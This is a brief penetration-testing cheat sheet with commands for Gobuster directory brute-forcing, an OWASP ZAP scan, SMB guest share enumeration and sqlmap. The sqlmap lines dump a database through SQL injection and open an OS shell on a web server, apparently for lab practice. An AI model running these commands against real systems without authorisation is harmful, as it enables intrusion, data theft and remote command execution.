---
title: "Finding things"
excerpt: "noisy ways to learn stuff - enumeration, mapping, dynamic analysis, etc."
---

## Tools

- [Gobuster](#gobuster)
- [OWASP ZAP](#owasp-zap)
- [sqlmap](#sqlmap)
- [nmap](../nmap) has its' own page

---

## Gobuster

First, get some wordlists.  I've been lazy and using the `wordlists` package in Kali.

```shell
gobuster dir \
  # specify the target and port
  -u http://domain-name-here:8000 \
  # with a big wordlist
  -w /usr/share/wordlists/dirb/big.txt \
  # but only return pdf and txt files
  -x pdf,txt
```

---

## OWASP ZAP

Run OWASP ZAP full scan in a Docker container, then output the results to `testreport.html`.

```shell
docker run --rm -v $(pwd):/zap/wrk/:rw \
  -t ghcr.io/zaproxy/zaproxy:stable zap-full-scan.py \
  -t http://TARGET-NAME:PORT \
  -g gen.conf \
  -r testreport.html
```

---

## smb

Once you see tcp/445 open, take a look around.

```shell
# list shares as guest
netexec smb [hostname/ip] -u guest -p '' --shares

# connect to a share as guest
smbclient //hostname/sharename -U guest%
```

---

## sqlmap

```shell
# dump the database
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump

# -T if you know the table you're interested in
# --threads to speed it up

# `-r` is for the post request (intercept w/ burp)
# `--os-shell`
# `--web-root` is a writable directory
sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
```
